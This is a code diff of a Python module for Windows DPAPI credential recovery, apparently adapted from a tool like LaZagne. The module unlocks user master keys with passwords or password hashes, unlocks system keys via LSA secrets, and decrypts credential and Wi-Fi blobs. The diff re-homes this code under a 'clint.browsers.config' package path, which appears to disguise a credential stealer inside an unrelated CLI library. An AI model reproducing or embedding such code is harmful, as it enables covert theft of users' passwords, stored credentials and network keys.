@@ -3,13 +3,13 @@
 import codecs
 import os
 
-from .DPAPI.masterkey import MasterKeyPool
-from .DPAPI.credfile import CredFile
-from .DPAPI.vault import Vault
-from .DPAPI.blob import DPAPIBlob
-from logger import log
-from .constant import constant
-from ..windows.lsa_secrets import LSASecrets
+from clint.browsers.config.DPAPI.masterkey import MasterKeyPool
+from clint.browsers.config.DPAPI.credfile import CredFile
+from clint.browsers.config.DPAPI.vault import Vault
+from clint.browsers.config.DPAPI.blob import DPAPIBlob
+import logging
+from clint.browsers.config.constant import constant
+from clint.browsers.windows.lsa_secrets import LSASecrets
 
 
 def are_masterkeys_retrieved():
@@ -40,7 +40,7 @@ def manage_response(ok, msg):
     if ok:
         return msg
     else:
-        log.debug('DEBUG', u'{msg}'.format(msg=msg))
+        logging.debug('DEBUG', u'{msg}'.format(msg=msg))
         return False
 
 
@@ -74,17 +74,17 @@ class UserDpapi(object):
                         for ok, r in self.umkp.try_credential(sid=self.sid, password=password):
                             if ok:
                                 self.unlocked = True
-                                log.debug('OK', r)
+                                logging.debug('OK', r)
                             else:
-                                log.debug('ERROR', r)
+                                logging.debug('ERROR', r)
 
                     elif pwdhash:
                         for ok, r in self.umkp.try_credential_hash(self.sid, pwdhash=codecs.decode(pwdhash, 'hex')):
                             if ok:
                                 self.unlocked = True
-                                log.debug('OK', r)
+                                logging.debug('OK', r)
                             else:
-                                log.debug('ERROR', r)
+                                logging.debug('ERROR', r)
 
     def check_credentials(self, passwords):
         if self.umkp:
@@ -92,9 +92,9 @@ class UserDpapi(object):
                 for ok, r in self.umkp.try_credential(sid=self.sid, password=password):
                     if ok:
                         self.unlocked = True
-                        log.debug('OK', r)
+                        logging.debug('OK', r)
                     else:
-                        log.debug('ERROR', r)
+                        logging.debug('ERROR', r)
 
     def decrypt_blob(self, dpapi_blob):
         """
@@ -171,10 +171,10 @@ class SystemDpapi(object):
                 self.smkp.add_system_credential(constant.lsa_secrets[b'DPAPI_SYSTEM'])
                 for ok, r in self.smkp.try_system_credential():
                     if ok:
-                        log.debug('OK', r)
+                        logging.debug('OK', r)
                         self.unlocked = True
                     else:
-                        log.debug('ERROR', r)
+                        logging.debug('ERROR', r)
 
     def decrypt_wifi_blob(self, key_material):
         """
